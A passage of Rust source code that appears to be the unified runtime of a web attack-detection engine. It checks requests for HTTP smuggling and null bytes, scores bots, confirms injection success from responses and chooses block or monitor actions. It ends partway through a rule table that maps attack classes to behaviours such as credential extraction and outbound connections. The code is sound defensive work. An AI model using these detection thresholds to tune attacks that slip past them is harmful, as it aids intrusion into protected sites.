//! Unified Detection Runtime
//!
//! The closed-loop orchestrator that connects ALL subsystems into a single
//! coherent pipeline. This is what turns INVARIANT from a collection of
//! detection modules into a unified defense system.
//!
//! Pipeline:
//!   1. INPUT → InvariantEngine.analyze() → matches, compositions, block recommendation
//!   2. MATCHES → ChainCorrelator.ingest() → attack chain detection
//!   3. MATCHES → CampaignIntelligence.record_signal() → behavioral fingerprinting
//!   4. CHAIN + CAMPAIGN → threat level calculation → defense decision
//!   5. MATCHES → ExploitKnowledgeGraph.enrich_detection() → CVE correlation
//!   6. ALL SIGNALS → effect simulation → adversary fingerprinting → shape validation
//!   7. ALL INTELLIGENCE → unified defense decision → response plan
//!
//! Memory model:
//!   - ChainCorrelator: 5,000 source windows × 200 signals = bounded
//!   - CampaignIntelligence: 10,000 sessions × behavioral fingerprints = bounded
//!   - Knowledge graph: static, shared, read-only after init

use std::collections::{HashMap, HashSet, VecDeque, hash_map::DefaultHasher};
use std::hash::{Hash, Hasher};
use serde::{Deserialize, Serialize};

use crate::campaign::{CampaignIntelligence, CampaignSignal, Campaign, EncodingPreference, AttackPhase};
use crate::chain::{ChainCorrelator, ChainSignal, ChainMatch};
use crate::body_parser::{
    FieldAnomaly, FieldContext, FieldType, ParsedBody, analyze_field, detect_json_injection,
    detect_multipart_abuse, infer_field_type, parse_body,
};
use crate::effect::{
    simulate_sql_effect, simulate_cmd_effect, simulate_xss_effect,
    simulate_path_effect, simulate_ssrf_effect, fingerprint_adversary,
    ExploitEffect, AdversaryFingerprint,
};
use crate::engine::InvariantEngine;
use crate::entropy::anomaly_confidence_multiplier;
use crate::knowledge::{DetectionEnrichment, ExploitKnowledgeGraph};
use crate::mitre::MitreMapper;
use crate::compliance::{ComplianceReport, compliance_report};
use crate::normalizer::detect_encoding_evasion;
use crate::polyglot::analyze_polyglot_input;
use crate::intent::{classify_intent, AttackIntent};
use crate::response::{generate_response_plan, DetectionContext};
use crate::response_analysis::{self, ResponseAnalysis, ResponseFindingType};
use crate::shape::{auto_validate_shape, ShapeValidation};
use crate::telemetry::{EngineHealth, Telemetry};
use crate::threat_intel::ThreatIntelFeed;
use crate::types::*;
use crate::api_schema::{ApiSchema, SchemaViolation, SchemaViolationType, validate_request};
use crate::bot_detect::{
    BotClassification, BotSignals, RequestTiming, analyze_headers, classify_bot,
    compute_bot_score, identify_browser_ja3, identify_known_bot_ja3, identify_legitimate_bot,
    is_automated_timing, is_credential_stuffing, is_known_scanner, parse_ja3,
};
use crate::rasp::{
    RaspContext, detect_path_traversal_via_file_taint, detect_rce_via_exec_taint,
    detect_sqli_via_query_taint, detect_ssrf_via_network_taint, detections_to_matches,
};

// ── Runtime Caching and Heuristics ─────────────────────────────────

const ANALYSIS_CACHE_SIZE: usize = 96;
const CVE_ENRICHMENT_CACHE_SIZE: usize = 192;
const MITRE_CACHE_SIZE: usize = 128;
const FAST_PATH_MAX_LEN: usize = 64;
const FAST_PATH_TRIGGER_CHARS: usize = 6;
const HOT_PATH_BUFFERED_CHAIN_MIN: usize = 2;
const MAX_FIELD_ANALYSIS_FIELDS: usize = 64;
const MAX_FIELD_ANALYSIS_VALUE_LEN: usize = 8192;

#[derive(Default)]
struct AnalysisCache {
    entries: HashMap<u64, AnalysisResult>,
    order: VecDeque<u64>,
    max_entries: usize,
}

#[derive(Hash, Eq, PartialEq, Clone)]
struct CveCacheKey {
    class: InvariantClass,
    vendor: Option<String>,
    product: Option<String>,
}

#[derive(Default)]
struct CveEnrichmentCache {
    entries: HashMap<CveCacheKey, DetectionEnrichment>,
    order: VecDeque<CveCacheKey>,
    max_entries: usize,
}

fn context_name(context: Option<&InputContext>) -> &'static str {
    match context {
        Some(InputContext::Sql) => "sql",
        Some(InputContext::Html) => "html",
        Some(InputContext::Shell) => "shell",
        Some(InputContext::Xml) => "xml",
        Some(InputContext::Json) => "json",
        Some(InputContext::Ldap) => "ldap",
        Some(InputContext::Template) => "template",
        Some(InputContext::Graphql) => "graphql",
        Some(InputContext::Url) => "url",
        Some(InputContext::Header) => "header",
        Some(InputContext::Unknown) | None => "unknown",
    }
}

#[derive(Default)]
struct MitreTechniqueCache {
    entries: HashMap<u64, Vec<&'static str>>,
    order: VecDeque<u64>,
    max_entries: usize,
}

impl MitreTechniqueCache {
    fn new(size: usize) -> Self {
        Self { max_entries: size, ..Self::default() }
    }

    fn get(&mut self, key: u64) -> Option<Vec<&'static str>> {
        let result = self.entries.get(&key).cloned()?;
        if let Some(pos) = self.order.iter().position(|k| *k == key) {
            self.order.remove(pos);
        }
        self.order.push_back(key);
        Some(result)
    }

    fn put(&mut self, key: u64, techniques: Vec<&'static str>) {
        if self.entries.contains_key(&key) {
            self.order.retain(|k| *k != key);
        }
        if self.entries.len() >= self.max_entries {
            if let Some(evict) = self.order.pop_front() {
                self.entries.remove(&evict);
            }
        }
        self.entries.insert(key, techniques);
        self.order.push_back(key);
    }
}

fn request_analysis_cache_key(request: &UnifiedRequest, known_context: Option<&InputContext>) -> u64 {
    let mut hasher = DefaultHasher::new();
    request.input.hash(&mut hasher);
    request.source_hash.hash(&mut hasher);
    request.method.hash(&mut hasher);
    request.path.hash(&mut hasher);
    request.content_type.hash(&mut hasher);
    known_context.hash(&mut hasher);
    request
        .source_reputation
        .unwrap_or(0.0_f64)
        .to_bits()
        .hash(&mut hasher);
    if let Some(tech) = &request.detected_tech {
        tech.vendor.hash(&mut hasher);
        tech.product.hash(&mut hasher);
        tech.framework.hash(&mut hasher);
        tech.version.hash(&mut hasher);
    }
    request.param_name.hash(&mut hasher);
    request.rasp_context.hash(&mut hasher);
    hasher.finish()
}

fn default_polyglot() -> crate::polyglot::PolyglotDetection {
    crate::polyglot::PolyglotDetection {
        is_polyglot: false,
        domains: Vec::new(),
        domain_count: 0,
        confidence_boost: 0.0,
        detail: "benign_fastpath".to_owned(),
    }
}

fn default_encoding_evasion() -> crate::normalizer::EncodingEvasionResult {
    crate::normalizer::EncodingEvasionResult {
        is_evasion: false,
        depth: 0,
        encodings: Vec::new(),
        confidence: 0.0,
    }
}

fn clamp_confidence(value: f64) -> f64 {
    if value.is_finite() {
        value.clamp(0.0, 1.0)
    } else {
        0.0
    }
}

fn clamp_match_confidences(matches: &mut [InvariantMatch]) {
    for m in matches {
        m.confidence = clamp_confidence(m.confidence);
    }
}

fn sanitize_header_value(value: &str) -> String {
    value
        .chars()
        .filter(|c| !matches!(c, '\r' | '\n' | '\0'))
        .collect()
}

fn sanitize_header_pairs(headers: &[(String, String)]) -> Vec<(String, String)> {
    headers
        .iter()
        .map(|(k, v)| (sanitize_header_value(k), sanitize_header_value(v)))
        .collect()
}

fn make_runtime_match(
    class: InvariantClass,
    confidence: f64,
    description: impl Into<String>,
) -> InvariantMatch {
    InvariantMatch {
        class,
        confidence: clamp_confidence(confidence),
        category: class.category(),
        severity: class.default_severity(),
        is_novel_variant: false,
        description: description.into(),
        detection_levels: DetectionLevels { l1: false, l2: true, convergent: false },
        l2_evidence: None,
        proof: None,
        cve_enrichment: None,
    }
}

fn parse_transfer_encodings(values: &[String]) -> (bool, bool) {
    let mut has_chunked = false;
    let mut ambiguous = false;

    for value in values {
        let mut seen_chunked = 0usize;
        let mut has_non_identity = false;
        let mut tokens = 0usize;
        let mut empty_token = false;

        for raw in value.split(',') {
            tokens += 1;
            let token = raw.trim().to_ascii_lowercase();
            if token.is_empty() {
                empty_token = true;
                continue;
            }
            let coding = token.split(';').next().unwrap_or("").trim();
            if coding == "chunked" {
                seen_chunked += 1;
                has_chunked = true;
            } else if coding != "identity" {
                has_non_identity = true;
            }
            if token.contains(';') {
                ambiguous = true;
            }
        }

        if empty_token || tokens == 0 || seen_chunked > 1 {
            ambiguous = true;
        }
        if seen_chunked > 0 && has_non_identity {
            ambiguous = true;
        }
    }

    if values.len() > 1 {
        let distinct: HashSet<String> = values
            .iter()
            .map(|v| v.trim().to_ascii_lowercase())
            .collect();
        if distinct.len() > 1 {
            ambiguous = true;
        }
    }

    (has_chunked, ambiguous)
}

fn parse_content_lengths(values: &[String]) -> (Vec<u64>, bool) {
    let mut parsed = Vec::new();
    let mut invalid = false;
    for value in values {
        let trimmed = value.trim();
        if trimmed.is_empty() {
            invalid = true;
            continue;
        }
        match trimmed.parse::<u64>() {
            Ok(v) => parsed.push(v),
            Err(_) => invalid = true,
        }
    }
    (parsed, invalid)
}

fn source_hash_is_weak(source_hash: &str) -> bool {
    let trimmed = source_hash.trim();
    if trimmed.is_empty() || trimmed.len() < 8 || trimmed.len() > 256 {
        return true;
    }
    let distinct = trimmed.chars().collect::<HashSet<char>>().len();
    distinct <= 2
}

fn derive_fallback_source_hash(
    request: &UnifiedRequest,
    sanitized_headers: &[(String, String)],
    user_agent: &str,
) -> Option<String> {
    if !source_hash_is_weak(&request.source_hash) {
        return None;
    }

    let mut hasher = DefaultHasher::new();
    request.method.to_ascii_uppercase().hash(&mut hasher);
    request.path.hash(&mut hasher);
    sanitize_header_value(user_agent).hash(&mut hasher);
    request.ja3.as_ref().map(|s| sanitize_header_value(s)).hash(&mut hasher);

    for (k, v) in sanitized_headers {
        if k.eq_ignore_ascii_case("x-forwarded-for")
            || k.eq_ignore_ascii_case("forwarded")
            || k.eq_ignore_ascii_case("cf-connecting-ip")
            || k.eq_ignore_ascii_case("x-real-ip")
        {
            k.to_ascii_lowercase().hash(&mut hasher);
            v.hash(&mut hasher);
        }
    }

    Some(format!("derived:{:016x}", hasher.finish()))
}

fn detect_runtime_protocol_anomalies(
    request: &UnifiedRequest,
    sanitized_headers: &[(String, String)],
) -> Vec<InvariantMatch> {
    let mut findings = Vec::new();

    let content_lengths: Vec<String> = sanitized_headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("content-length"))
        .map(|(_, v)| v.clone())
        .collect();
    let transfer_encodings: Vec<String> = sanitized_headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("transfer-encoding"))
        .map(|(_, v)| v.clone())
        .collect();
    let expect_values: Vec<String> = sanitized_headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("expect"))
        .map(|(_, v)| v.clone())
        .collect();
    let content_type_values: Vec<String> = sanitized_headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("content-type"))
        .map(|(_, v)| v.clone())
        .collect();

    let has_te = !transfer_encodings.is_empty();
    let has_cl = !content_lengths.is_empty();
    let (parsed_lengths, invalid_cl) = parse_content_lengths(&content_lengths);
    let (has_chunked, ambiguous_chunked) = parse_transfer_encodings(&transfer_encodings);

    if has_te && has_cl {
        findings.push(make_runtime_match(
            InvariantClass::HttpSmuggleClTe,
            0.98,
            "runtime_header_conflict:content-length+transfer-encoding",
        ));
    }

    if invalid_cl {
        findings.push(make_runtime_match(
            InvariantClass::HttpSmuggleClTe,
            0.92,
            "runtime_header_conflict:invalid_content_length",
        ));
    }

    if !parsed_lengths.is_empty() {
        let distinct_lengths: HashSet<u64> = parsed_lengths.iter().copied().collect();
        if distinct_lengths.len() > 1 {
            findings.push(make_runtime_match(
                InvariantClass::HttpSmuggleClTe,
                0.95,
                "runtime_header_conflict:multiple_content_length_values",
            ));
        }
        if distinct_lengths.contains(&0) && !request.input.is_empty() && !has_te {
            findings.push(make_runtime_match(
                InvariantClass::HttpSmuggleZeroCl,
                0.90,
                "runtime_header_conflict:content_length_zero_with_body",
            ));
        }
    }

    if has_te && !has_chunked {
        findings.push(make_runtime_match(
            InvariantClass::HttpSmuggleChunkExt,
            0.78,
            "runtime_transfer_encoding:missing_chunked_terminal_coding",
        ));
    }

    if ambiguous_chunked {
        findings.push(make_runtime_match(
            InvariantClass::HttpSmuggleChunkExt,
            0.93,
            "runtime_transfer_encoding:ambiguous_chunked_encoding",
        ));
    }

    let expect_continue = expect_values
        .iter()
        .any(|v| v.to_ascii_lowercase().contains("100-continue"));
    if expect_continue && (has_te || has_cl) {
        findings.push(make_runtime_match(
            InvariantClass::HttpSmuggleExpect,
            0.82,
            "runtime_expect_header:100-continue_with_length_or_te",
        ));
    }

    if content_type_values.len() > 1 {
        let distinct_ct: HashSet<String> = content_type_values
            .iter()
            .map(|v| v.trim().to_ascii_lowercase())
            .filter(|v| !v.is_empty())
            .collect();
        if distinct_ct.len() > 1 {
            findings.push(make_runtime_match(
                InvariantClass::HttpSmuggleH2,
                0.88,
                "runtime_header_ambiguity:duplicate_content_type",
            ));
        }
    }

    if sanitized_headers
        .iter()
        .any(|(k, v)| k.len() > 8 * 1024 || v.len() > 8 * 1024)
    {
        findings.push(make_runtime_match(
            InvariantClass::HttpSmuggleH2,
            0.85,
            "runtime_header_ambiguity:oversized_header_field",
        ));
    }

    let has_null_bytes = request.input.contains('\0')
        || request.path.contains('\0')
        || request.method.contains('\0')
        || request.source_hash.contains('\0')
        || request
            .content_type
            .as_ref()
            .is_some_and(|ct| ct.contains('\0'))
        || request
            .user_agent
            .as_ref()
            .is_some_and(|ua| ua.contains('\0'))
        || request
            .ja3
            .as_ref()
            .is_some_and(|ja3| ja3.contains('\0'))
        || request
            .headers
            .iter()
            .any(|(k, v)| k.contains('\0') || v.contains('\0'));
    if has_null_bytes {
        findings.push(make_runtime_match(
            InvariantClass::PathNullTerminate,
            0.96,
            "runtime_string_anomaly:null_byte_present",
        ));
    }

    findings
}

fn merge_runtime_matches(matches: &mut Vec<InvariantMatch>, runtime_matches: Vec<InvariantMatch>) {
    for runtime_match in runtime_matches {
        if let Some(existing) = matches.iter_mut().find(|m| m.class == runtime_match.class) {
            existing.confidence = clamp_confidence(existing.confidence.max(runtime_match.confidence));
            existing.severity = std::cmp::max(existing.severity, runtime_match.severity);
            if runtime_match.description.len() > existing.description.len() {
                existing.description = runtime_match.description;
            }
        } else {
            matches.push(runtime_match);
        }
    }
}

fn apply_runtime_findings_to_recommendation(
    recommendation: &mut crate::types::BlockRecommendation,
    matches: &[InvariantMatch],
) {
    let mut runtime_block = false;
    for m in matches {
        if m.confidence >= m.severity.block_threshold() {
            runtime_block = true;
            recommendation.threshold = recommendation.threshold.min(m.severity.block_threshold());
        }
    }
    if runtime_block {
        recommendation.block = true;
        recommendation.reason = "runtime_protocol_anomaly".to_owned();
        recommendation.confidence = clamp_confidence(matches.iter().map(|m| m.confidence).fold(0.0_f64, f64::max));
    }
}

fn enforce_critical_action(decision: &mut DefenseDecision, matches: &[InvariantMatch]) {
    if matches.iter().any(|m| m.severity == Severity::Critical) && decision.action < DefenseAction::Block {
        decision.action = DefenseAction::Block;
        decision.alert = true;
        decision.confidence = decision.confidence.max(0.90);
        if decision.reason == "no_detections" || decision.reason == "detections_below_threshold" {
            decision.reason = "critical_detection_enforced_block".to_owned();
        }
        if !decision
            .contributors
            .iter()
            .any(|c| c == "policy:critical_severity_enforcement")
        {
            decision
                .contributors
                .push("policy:critical_severity_enforcement".to_owned());
        }
    }
}

fn normalize_decision(decision: &mut DefenseDecision, matches: &[InvariantMatch]) {
    enforce_critical_action(decision, matches);
    decision.confidence = clamp_confidence(decision.confidence);
}

fn to_serialized_intent(intent: &crate::intent::IntentClassification) -> crate::types::IntentClassification {
    crate::types::IntentClassification {
        primary_intent: format!("{:?}", intent.primary_intent),
        intents: intent.intents.iter().map(|intent| format!("{:?}", intent)).collect(),
        confidence: intent.confidence,
        detail: intent.detail.clone(),
        severity_multiplier: intent.severity_multiplier,
        targets: intent.targets.clone(),
    }
}

fn has_suspicious_ascii(input: &str) -> bool {
    let mut hits = 0usize;
    for b in input.bytes() {
        if matches!(b, b'<' | b'>' | b'"' | b'\'' | b'`' | b'|' | b';' | b'&' | b'$' | b'(' | b')') {
            hits += 1;
        }
    }
    hits >= FAST_PATH_TRIGGER_CHARS
}

fn should_run_full_analysis(request: &UnifiedRequest, l1_matches: &[InvariantMatch], known_context: Option<&InputContext>) -> bool {
    if !l1_matches.is_empty() { return true; }
    if request.source_reputation.unwrap_or(0.0_f64) >= 0.65 { return true; }
    if known_context.is_some() {
        return true;
    }
    if request.path.len() >= FAST_PATH_MAX_LEN && has_suspicious_ascii(&request.path) { return true; }
    if request.input.len() > 4096 { return true; }
    has_suspicious_ascii(&request.input)
}

fn has_response_context(request: &UnifiedRequest) -> bool {
    request.response_status.is_some()
        || request
            .response_headers
            .as_ref()
            .is_some_and(|headers| !headers.is_empty())
        || request
            .response_body
            .as_ref()
            .is_some_and(|body| !body.trim().is_empty())
}

fn build_response_analysis(request: &UnifiedRequest, request_classes: &[InvariantClass]) -> Option<ResponseAnalysis> {
    if !has_response_context(request) {
        return None;
    }

    let status = request.response_status.unwrap_or(0);
    let headers = request.response_headers.as_deref().unwrap_or(&[]);
    let body = request.response_body.as_deref().unwrap_or("");

    let mut analysis = response_analysis::analyze_response(status, headers, body, request_classes);

    if request_classes.iter().any(|c| matches!(
        c,
        InvariantClass::SqlStringTermination
            | InvariantClass::SqlTautology
            | InvariantClass::SqlUnionExtraction
            | InvariantClass::SqlStackedExecution
            | InvariantClass::SqlTimeOracle
            | InvariantClass::SqlErrorOracle
            | InvariantClass::SqlCommentTruncation
            | InvariantClass::JsonSqlBypass
    )) {
        if let Some(confirm) = response_analysis::confirm_sqli_success(&request.input, body) {
            analysis
                .findings
                .push(response_analysis::confirmation_to_finding(confirm, Severity::Critical));
        }
    }

    if request_classes.iter().any(|c| matches!(
        c,
        InvariantClass::XssTagInjection
            | InvariantClass::XssAttributeEscape
            | InvariantClass::XssEventHandler
            | InvariantClass::XssProtocolHandler
            | InvariantClass::XssTemplateExpression
    )) {
        if let Some(confirm) = response_analysis::confirm_xss_reflection(&request.input, body) {
            analysis
                .findings
                .push(response_analysis::confirmation_to_finding(confirm, Severity::Critical));
        }
    }

    if request_classes.iter().any(|c| matches!(
        c,
        InvariantClass::SsrfInternalReach
            | InvariantClass::SsrfCloudMetadata
            | InvariantClass::SsrfProtocolSmuggle
    )) {
        if let Some(confirm) = response_analysis::confirm_ssrf_success(status, body) {
            analysis
                .findings
                .push(response_analysis::confirmation_to_finding(confirm, Severity::Critical));
        }
    }

    Some(analysis)
}

fn apply_response_findings_to_decision(decision: &mut DefenseDecision, analysis: Option<&ResponseAnalysis>) {
    let Some(analysis) = analysis else {
        return;
    };
    if analysis.findings.is_empty() {
        return;
    }

    let mut max_sev = Severity::Low;
    for finding in &analysis.findings {
        max_sev = std::cmp::max(max_sev, finding.severity);
        let detail_snippet: String = finding.detail.chars().take(60).collect();
        decision.contributors.push(format!(
            "response:{:?}:{}",
            finding.finding_type,
            detail_snippet
        ));
        if finding.finding_type == ResponseFindingType::ExploitConfirmation {
            decision.alert = true;
        }
    }

    match max_sev {
        Severity::Critical => {
            decision.action = std::cmp::max(decision.action, DefenseAction::Block);
            decision.confidence = decision.confidence.max(0.93);
            if decision.reason == "no_detections" {
                decision.reason = "response_exploit_or_data_leak_critical".to_owned();
            }
            decision.alert = true;
        }
        Severity::High => {
            decision.action = std::cmp::max(decision.action, DefenseAction::Monitor);
            decision.confidence = decision.confidence.max(0.80);
            if decision.reason == "no_detections" {
                decision.reason = "response_data_leak_indicators".to_owned();
            }
        }
        Severity::Medium => {
            decision.action = std::cmp::max(decision.action, DefenseAction::Monitor);
            decision.confidence = decision.confidence.max(0.65);
        }
        Severity::Low => {}
    }
}

fn mitre_cache_key(classes: &[InvariantClass]) -> u64 {
    let mut hasher = DefaultHasher::new();
    for class in classes {
        class.hash(&mut hasher);
    }
    hasher.finish()
}

fn build_fast_analysis(request: &UnifiedRequest, mut matches: Vec<InvariantMatch>) -> AnalysisResult {
    let rep = request.source_reputation.unwrap_or(0.0_f64);
    let rep_boost = if rep > 0.6 { (rep - 0.6) * 0.4 } else { 0.0 };

    let mut max_confidence = 0.0_f64;
    let mut thresholds = Vec::new();
    let mut block_reasons = Vec::new();

    for m in matches.iter_mut() {
        m.confidence = clamp_confidence(m.confidence);
        if rep_boost > 0.0 {
            m.confidence = clamp_confidence((m.confidence + rep_boost).min(0.99));
        }
        max_confidence = max_confidence.max(m.confidence);
        let threshold = m.severity.block_threshold();
        thresholds.push(threshold);
        if m.confidence >= threshold {
            block_reasons.push(format!("{:?}:{:.2}", m.class, m.confidence));
        }
    }

    let reason = if block_reasons.is_empty() {
        "below_fast_confidence_thresholds".to_owned()
    } else {
        block_reasons.join("|")
    };

    let threshold = thresholds.into_iter().fold(0.95_f64, f64::min);
    AnalysisResult {
        matches,
        compositions: Vec::new(),
        correlations: Vec::new(),
        recommendation: crate::types::BlockRecommendation {
            block: !block_reasons.is_empty(),
            confidence: clamp_confidence(max_confidence),
            reason,
            threshold,
        },
        novel_by_l2: 0,
        novel_by_l3: 0,
        convergent: 0,
        processing_time_us: 0.0,
        contexts: request.known_context.iter().cloned().collect(),
        cve_enrichment: None,
        polyglot: None,
        anomaly_score: None,
        encoding_evasion: false,
        intent: None,
    }
}

fn requires_post_processing_artifacts(matches: &[InvariantMatch], decision: &DefenseDecision, threat_level: f64) -> bool {
    if matches.is_empty() { return false; }
    if threat_level >= 80.0 { return true; }
    match decision.action {
        DefenseAction::Allow | DefenseAction::Monitor | DefenseAction::Challenge
        | DefenseAction::Block | DefenseAction::Lockdown | DefenseAction::Throttle => true,
    }
}

fn split_path_and_query(path: &str) -> (&str, &str) {
    if let Some((p, q)) = path.split_once('?') {
        (p, q)
    } else {
        (path, "")
    }
}

fn apply_schema_violations_to_decision(decision: &mut DefenseDecision, violations: &[SchemaViolation]) {
    if violations.is_empty() {
        return;
    }

    let mut severe_violation = false;
    for violation in violations {
        if matches!(
            violation.violation_type,
            SchemaViolationType::UnknownEndpoint
                | SchemaViolationType::ExtraField
                | SchemaViolationType::DepthExceeded
        ) {
            severe_violation = true;
            break;
        }
    }

    decision.action = if severe_violation {
        std::cmp::max(decision.action, DefenseAction::Challenge)
    } else {
        std::cmp::max(decision.action, DefenseAction::Monitor)
    };
    decision.confidence = decision
        .confidence
        .max(if severe_violation { 0.7 } else { 0.55 });
    decision
        .contributors
        .push(format!("api_schema:violations:{}", violations.len()));
    if decision.reason == "no_detections" {
        decision.reason = "api_schema_violation".to_owned();
    } else if !decision.reason.contains("api_schema_violation") {
        decision.reason.push_str("|api_schema_violation");
    }
}

impl AnalysisCache {
    fn new(size: usize) -> Self {
        Self { max_entries: size, ..Self::default() }
    }

    fn get(&mut self, key: u64) -> Option<AnalysisResult> {
        let result = self.entries.get(&key).cloned()?;
        if let Some(pos) = self.order.iter().position(|k| *k == key) {
            self.order.remove(pos);
        }
        self.order.push_back(key);
        Some(result)
    }

    fn put(&mut self, key: u64, result: AnalysisResult) {
        if self.entries.contains_key(&key) {
            self.order.retain(|k| *k != key);
        }
        if self.entries.len() >= self.max_entries {
            if let Some(evict) = self.order.pop_front() {
                self.entries.remove(&evict);
            }
        }
        self.entries.insert(key, result);
        self.order.push_back(key);
    }
}

impl CveEnrichmentCache {
    fn new(size: usize) -> Self {
        Self { max_entries: size, ..Self::default() }
    }

    fn get(&mut self, key: &CveCacheKey) -> Option<DetectionEnrichment> {
        let result = self.entries.get(key).cloned()?;
        if let Some(pos) = self.order.iter().position(|k| *k == *key) {
            self.order.remove(pos);
        }
        self.order.push_back(key.clone());
        Some(result)
    }

    fn put(&mut self, key: CveCacheKey, enrichment: DetectionEnrichment) {
        if self.entries.contains_key(&key) {
            self.order.retain(|k| *k != key);
        }
        if self.entries.len() >= self.max_entries {
            if let Some(evict) = self.order.pop_front() {
                self.entries.remove(&evict);
            }
        }
        self.entries.insert(key.clone(), enrichment);
        self.order.push_back(key);
    }
}

// ── Unified Request / Response Types ──────────────────────────────

/// A request to the unified runtime.
#[derive(Debug, Clone, PartialEq)]
pub struct UnifiedRequest {
    /// Raw untrusted input.
    pub input: String,
    /// Stable source identifier used for temporal correlation.
    pub source_hash: String,
    /// HTTP method.
    pub method: String,
    /// HTTP request path.
    pub path: String,
    /// Optional request content type.
    pub content_type: Option<String>,
    /// Optional caller-supplied parsing context.
    pub known_context: Option<InputContext>,
    /// Ordered HTTP headers as received at the edge.
    pub headers: Vec<(String, String)>,
    /// Optional user-agent override when headers are not available.
    pub user_agent: Option<String>,
    /// Optional TLS JA3/JA4-compatible raw fingerprint string.
    pub ja3: Option<String>,
    /// Optional source reputation score in `[0.0, 1.0]`.
    pub source_reputation: Option<f64>,
    /// Optional detected technology fingerprint.
    pub detected_tech: Option<DetectedTech>,
    /// Optional parameter name for shape validation.
    pub param_name: Option<String>,
    /// Optional application-layer RASP runtime context.
    pub rasp_context: Option<RaspContext>,
    /// Optional HTTP response status associated with this request.
    pub response_status: Option<u16>,
    /// Optional HTTP response headers associated with this request.
    pub response_headers: Option<Vec<(String, String)>>,
    /// Optional HTTP response body associated with this request.
    pub response_body: Option<String>,
    /// Recent request paths for behavioral bot heuristics.
    pub recent_paths: Vec<String>,
    /// Recent inter-request intervals (ms) for timing automation heuristics.
    pub recent_intervals_ms: Vec<u64>,
    /// Event timestamp in milliseconds.
    pub timestamp: u64,
}

impl Default for UnifiedRequest {
    fn default() -> Self {
        Self {
            input: String::new(),
            source_hash: String::new(),
            method: "GET".to_owned(),
            path: "/".to_owned(),
            content_type: None,
            known_context: None,
            headers: Vec::new(),
            user_agent: None,
            ja3: None,
            source_reputation: None,
            detected_tech: None,
            param_name: None,
            rasp_context: None,
            response_status: None,
            response_headers: None,
            response_body: None,
            recent_paths: Vec::new(),
            recent_intervals_ms: Vec::new(),
            timestamp: 0,
        }
    }
}

/// Technology fingerprint used to scope CVE enrichment.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DetectedTech {
    /// Vendor name, e.g. `postgresql`.
    pub vendor: String,
    /// Product name, e.g. `postgres`.
    pub product: String,
    /// Optional framework.
    pub framework: Option<String>,
    /// Optional version string.
    pub version: Option<String>,
}

/// The unified defense decision.
#[derive(Debug, Clone, PartialEq)]
pub struct DefenseDecision {
    /// Final policy action selected by runtime orchestration.
    pub action: DefenseAction,
    /// Human-readable reason for SOC and logs.
    pub reason: String,
    /// Confidence in decision quality.
    pub confidence: f64,
    /// Internal evidence contributors used for traceability.
    pub contributors: Vec<String>,
    /// Whether to emit immediate alerting.
    pub alert: bool,
}

impl Default for DefenseDecision {
    fn default() -> Self {
        Self {
            action: DefenseAction::Allow,
            reason: "no_detections".to_owned(),
            confidence: 0.0,
            contributors: Vec::new(),
            alert: false,
        }
    }
}

/// Runtime action policy ladder in increasing strictness order.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum DefenseAction {
    /// Allow request without extra controls.
    Allow,
    /// Allow but track behavior.
    Monitor,
    /// Apply traffic throttling.
    Throttle,
    /// Require interactive challenge.
    Challenge,
    /// Block request.
    Block,
    /// Highest-severity containment action.
    Lockdown,
}

/// The full unified response.
#[derive(Debug)]
pub struct UnifiedResponse {
    /// Detection analysis output.
    pub analysis: AnalysisResult,
    /// Maximum severity across all detected matches.
    pub highest_severity: Severity,

    /// Active chain matches generated from temporal correlation.
    pub chain_matches: Vec<ChainMatch>,
    /// Active campaign associated with the source, if any.
    pub active_campaign: Option<Campaign>,
    /// Current campaign phase for the source, if any.
    pub attack_phase: Option<AttackPhase>,
    /// Campaign threat level for the source.
    pub threat_level: f64,
    /// Aggregated bot-likelihood score (0.0 human, 1.0 bot).
    pub bot_score: f64,
    /// Runtime bot/human classification derived from request-level signals.
    pub bot_classification: BotClassification,

    /// Number of unique linked CVEs.
    pub linked_cve_count: usize,
    /// CVE IDs with active exploitation indicators.
    pub actively_exploited_cves: Vec<String>,
    /// Highest EPSS score across linked CVEs.
    pub highest_epss: f64,

    /// Final defense decision.
    pub decision: DefenseDecision,
    /// MITRE ATT&CK techniques mapped from detected classes.
    pub mitre_techniques: Vec<String>,
    /// Compliance controls and audit evidence for detected classes.
    pub compliance_mappings: ComplianceReport,
    /// API contract violations detected by schema enforcement.
    pub schema_violations: Vec<SchemaViolation>,

    /// Simulated exploitation effect, if available.
    pub effect_simulation: Option<ExploitEffect>,
    /// Adversary fingerprint inferred from payload and classes.
    pub adversary_fingerprint: Option<AdversaryFingerprint>,
    /// Shape-validation result for param-bound payloads.
    pub shape_validation: Option<ShapeValidation>,

    /// Recommended response plan generated from final context.
    pub response_plan: Option<crate::response::ResponsePlan>,
    /// Optional response-side leak/exploit analysis when response context is present.
    pub response_analysis: Option<ResponseAnalysis>,

    /// End-to-end runtime latency in microseconds.
    pub total_processing_time_us: f64,
}

// ── Data-Driven Behavior Tables ───────────────────────────────────

struct ClassBehaviorRule {
    classes: &'static [InvariantClass],
    behaviors: &'static [&'static str],
}

struct ContentBehaviorRule {
    classes: &'static [InvariantClass],
    patterns: &'static [&'static str],
    behaviors: &'static [&'static str],
}

struct PathBehaviorRule {
    path_prefixes: &'static [&'static str],
    behaviors: &'static [&'static str],
}

static CLASS_BEHAVIORS: &[ClassBehaviorRule] = &[
    ClassBehaviorRule { classes: &[InvariantClass::MassAssignment, InvariantClass::AuthNoneAlgorithm], behaviors: &["privilege_escalation"] },
    ClassBehaviorRule { classes: &[InvariantClass::ProtoPollution, InvariantClass::ProtoPollutionGadget], behaviors: &["property_injection"] },
    ClassBehaviorRule { classes: &[InvariantClass::SsrfCloudMetadata], behaviors: &["credential_extraction"] },
    ClassBehaviorRule { classes: &[InvariantClass::LogJndiLookup], behaviors: &["outbound_connection", "class_loading"] },
    ClassBehaviorRule { classes: &[InvariantClass::JwtKidInjection, InvariantClass::JwtJwkEmbedding, InvariantClass::JwtConfusion, InvariantClass::AuthNoneAlgorithm], behaviors: &["auth_bypass", "token_forgery"] },
    ClassBehaviorRule { classes: &[InvariantClass::CachePoisoning, InvariantClass::CacheDeception], behaviors: &["cache_manipulation"] },
    ClassBehaviorRule { classes: &[InvariantClass::BolaIdor], behaviors: &["authorization_bypass"] },
